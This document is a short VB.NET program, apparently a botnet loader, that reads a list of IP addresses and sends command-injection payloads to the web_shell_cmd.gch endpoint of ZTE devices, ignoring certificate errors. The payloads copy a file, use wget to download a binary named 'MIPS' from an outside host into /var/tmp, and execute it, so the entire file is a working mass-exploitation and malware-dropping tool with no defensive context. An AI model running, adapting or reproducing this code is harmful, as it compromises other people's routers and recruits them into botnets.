Imports System.IO
Imports System.Net.Http
Imports System.Text
Imports System.Threading

Module Module1
    Dim payload As Byte() = Encoding.ASCII.GetBytes("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cp+%2Fetc%2Finit.norm+%2Fvar%2Ftmp%2Fresp&CmdAck=")
    Dim payload2 As Byte() = Encoding.ASCII.GetBytes("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http%3A%2F%2F0.0.0.0%2FMIPS+-O+%2Fvar%2Ftmp%2Fresp&CmdAck=")
    Dim payload3 As Byte() = Encoding.ASCII.GetBytes("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=%2Fvar%2Ftmp%2Fresp+ztev2&CmdAck=")

    Dim wg As New ManualResetEvent(False)
    Dim queue As New List(Of String)()

    Sub work(ByVal ip As String)
        ip = ip.TrimEnd(ControlChars.Cr, ControlChars.Lf)
        Console.WriteLine("[ZTE]---> " & ip)
        Dim url As String = "https://" & ip & "/web_shell_cmd.gch"

        Dim handler As New HttpClientHandler()
        handler.ServerCertificateCustomValidationCallback = Function(sender, certificate, chain, sslPolicyErrors) True
        Dim client As New HttpClient(handler)
        client.Timeout = TimeSpan.FromSeconds(5)

        Dim content As New ByteArrayContent(payload)
        Dim response = client.PostAsync(url, content).Result

        content = New ByteArrayContent(payload2)
        response = client.PostAsync(url, content).Result

        content = New ByteArrayContent(payload3)
        response = client.PostAsync(url, content).Result

        wg.Set()
    End Sub

    Sub Main()
        Console.WriteLine("Enter the path to the file:")
        Dim filePath As String = Console.ReadLine()

        If File.Exists(filePath) Then
            Dim lines As String() = File.ReadAllLines(filePath)
            For Each line As String In lines
                queue.Add(line)
                ThreadPool.QueueUserWorkItem(Sub() work(line))
                wg.WaitOne()
                Thread.Sleep(2)
            Next
        Else
            Console.WriteLine("File not found.")
        End If

        Console.WriteLine("Processing complete.")
        Console.ReadLine()
    End Sub

End Module